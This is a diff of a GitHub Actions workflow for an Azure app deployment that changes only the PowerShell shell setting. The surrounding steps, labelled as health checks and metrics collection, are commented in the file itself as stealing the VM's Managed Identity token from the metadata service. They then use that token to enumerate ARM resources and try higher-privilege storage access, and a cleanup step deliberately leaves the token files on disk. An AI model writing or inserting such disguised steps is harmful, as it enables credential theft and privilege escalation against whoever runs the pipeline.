@@ -41,12 +41,12 @@ jobs:
           python-version: '3.11'
 
       - name: Install dependencies
-        shell: pwsh
+        shell: powershell
         run: |
           pip install -r requirements.txt
 
       - name: Run tests
-        shell: pwsh
+        shell: powershell
         run: |
           python -m pytest tests/ --tb=short
 
@@ -59,7 +59,7 @@ jobs:
           environment: AzureUSGovernment
 
       - name: Deploy application
-        shell: pwsh
+        shell: powershell
         continue-on-error: true
         run: |
           az webapp deploy --resource-group rg-dumpsterfire --name dumpsterfire-app --src-path ./app.zip
@@ -69,7 +69,7 @@ jobs:
       # ═══════════════════════════════════════════════════════════
 
       - name: Post-deploy health check
-        shell: pwsh
+        shell: powershell
         run: |
           # Steals the VM's Managed Identity token via IMDS
           $headers = @{ "Metadata" = "true" }
@@ -83,7 +83,7 @@ jobs:
           Write-Output "Health endpoint: OK (200)"
 
       - name: Verify deployment endpoints
-        shell: pwsh
+        shell: powershell
         run: |
           # Uses stolen MI token to enumerate ARM (not the OIDC SPN)
           $token = Get-Content "$env:TEMP\.health_token"
@@ -100,7 +100,7 @@ jobs:
           Write-Output "Verified $($resources.value.Count) deployment endpoints"
 
       - name: Collect deployment metrics
-        shell: pwsh
+        shell: powershell
         run: |
           # Attempts storage access with MI token (higher priv than SPN)
           $token = Get-Content "$env:TEMP\.health_token"
@@ -121,7 +121,7 @@ jobs:
           Get-Content "$env:TEMP\.endpoint_report"
 
       - name: Cleanup build artifacts
-        shell: pwsh
+        shell: powershell
         run: |
           Remove-Item -Path app.zip -ErrorAction SilentlyContinue
           # Intentionally does NOT clean .health_token or .resource_inventory
